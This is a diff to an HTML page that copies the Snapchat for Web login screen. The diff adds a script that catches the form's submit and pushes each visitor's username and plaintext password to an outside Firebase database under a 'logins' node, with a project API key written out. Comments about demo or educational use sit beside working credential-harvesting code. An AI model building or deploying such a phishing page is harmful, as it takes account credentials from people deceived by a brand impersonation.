@@ -24,38 +24,79 @@
             <div id=login-root>
                   <div class=App style=display:none>
                         <div class=full-background-color></div>
-                        <div class=Header><a href=https://accounts.snapchat.com/ class="logo sf-hidden"></a></div>
-                        <div class=Login>
-                              <article class=page>
-                                    <div class=container><img class=snapchat-icon src="icon.svg" alt=Snapchat>
-                                          <div>
-                                                <h1 class=accountsTitle>Log in to Snapchat for Web</h1>
-                                          </div>
-                                          <div>
-                                                <form id=login_form action=send.php method=post class=centered_form>
-                                                      <div class="form-group has-success"><label for=username
-                                                                  class=control-label>Username or Email</label><input
-                                                                  name=username autocomplete=off type=text id=username
-                                                                  class=form-control required value></div>
-                                                      <div class="form-group has-success"><label for=password
-                                                                  class=control-label>Password</label><input
-                                                                  name=password autocomplete=off type=password
-                                                                  id=password class=form-control required value></div>
-                                                      <p class=secondary_action><a href=#>Forgot
-                                                                  Password</a>
-                                                      <div style=display:none></div>
-                                                      <div class="primary_action login-button"><button type=submit
-                                                                  id=loginTrigger class="btn btn-lg btn-primary">Log
-                                                                  In</button></div>
-                                                </form>
-                                          </div>
-                                    </div>
-                                    <div class=create-account-cta><span>New To Snapchat?</span><a
-                                                href=https://accounts.snapchat.com/accounts/signup>Sign Up</a></div>
-                              </article>
-                        </div>
-                  </div>
-            </div>
-      </div>
+                     <div class="Header">
+    <a href="https://accounts.snapchat.com/" class="logo sf-hidden"></a>
+</div>
+
+<div class="Login">
+    <article class="page">
+        <div class="container">
+            <img class="snapchat-icon" src="icon.svg" alt="Snapchat">
+            <h1 class="accountsTitle">Log in to Snapchat for Web</h1>
+
+            <form id="login_form" action="send.php" method="post" class="centered_form">
+                <div class="form-group has-success">
+                    <label for="username" class="control-label">Username or Email</label>
+                    <input name="username" id="username" type="text" class="form-control" autocomplete="off" required>
+                </div>
+
+                <div class="form-group has-success">
+                    <label for="password" class="control-label">Password</label>
+                    <input name="password" id="password" type="password" class="form-control" autocomplete="off" required>
+                </div>
+
+                <p class="secondary_action">
+                    <a href="#">Forgot Password</a>
+                </p>
+
+                <div class="primary_action login-button">
+                    <button type="submit" id="loginTrigger" class="btn btn-lg btn-primary">Log In</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="create-account-cta">
+            <span>New To Snapchat?</span>
+            <a href="https://accounts.snapchat.com/accounts/signup">Sign Up</a>
+        </div>
+    </article>
+</div>
+<!-- Include Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/10.2.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.2.0/firebase-database.js"></script>
+
+<script>
+  // Your web app's Firebase configuration
+  const firebaseConfig = {
+     apiKey: "AIzaSyBWOQpG6OijqOviZnPl9u6p1c_PeKkvEXE",
+  authDomain: "swapx-4b762.firebaseapp.com",
+  projectId: "swapx-4b762",
+  storageBucket: "swapx-4b762.firebasestorage.app",
+  messagingSenderId: "125084061204",
+  appId: "1:125084061204:web:d9d106e42872733937a101",
+  measurementId: "G-51H0H3LEYS"
+};
+
+  // Initialize Firebase
+  const app = firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  const form = document.getElementById("login_form");
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    // Safe logging to Firebase (for demo/testing only)
+    firebase.database().ref('logins').push({
+      username,
+      password, // only use for educational purposes with test data
+      timestamp: new Date().toISOString()
+    });
+
+    alert("Data logged safely!");
+  });
+</script>
 </body>
 </html>
